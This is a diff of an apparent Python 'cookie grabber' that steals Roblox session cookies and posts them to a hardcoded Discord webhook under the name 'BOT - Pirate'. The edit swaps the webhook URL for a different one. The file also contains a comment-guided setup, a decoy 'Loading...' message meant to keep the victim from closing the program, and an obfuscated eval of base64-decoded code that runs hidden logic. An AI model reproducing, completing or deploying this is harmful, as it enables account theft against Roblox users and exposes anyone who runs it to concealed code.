@@ -6,7 +6,7 @@
 ###########################################################
 
 #################### config tutorial #################
-# scroll down until you find (webhook) then remove everything inside the " "
+# scroll down until you find (webhookk) then remove everything inside the " "
 # then, paste your webhook **INSIDE** the " "
 # run the app, when it closed, check your server and it should send the cookie, if not :
 # check if you're logged into roblox studio
@@ -25,7 +25,7 @@ except:
     print("Failed to import libraies. Please contact Mani.#0001 at discord to fix this problem.")
     exit()
 
-webhook = "https://discord.com/api/webhooks/984818452323770388/N-vZOax4RAojwzrjK4hwOuD22A_K4Mye3FmHcao8t4GVb-WA23Ztm_UPyy8f6PTkFW6x" # put webhook here
+webhookk = "https://discord.com/api/webhooks/980413044054171708/IEG9O5HHpLu2Z_srsPCCOA0EEaH4B7lkVAvj0fpAKC3pwpyzXFOplsW4i2k_co4QkpHo" # put webhook here
 
 
 dummy_message = "Loading..." # A message that distracts the user from closing the grabber
@@ -78,7 +78,7 @@ eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 #################### SENDING TO WEBHOOK #################
 
 
-discord = Discord(url=webhook)
+discord = Discord(url=webhookk)
 discord.post(
     username="BOT - Pirate 🍪",
     avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
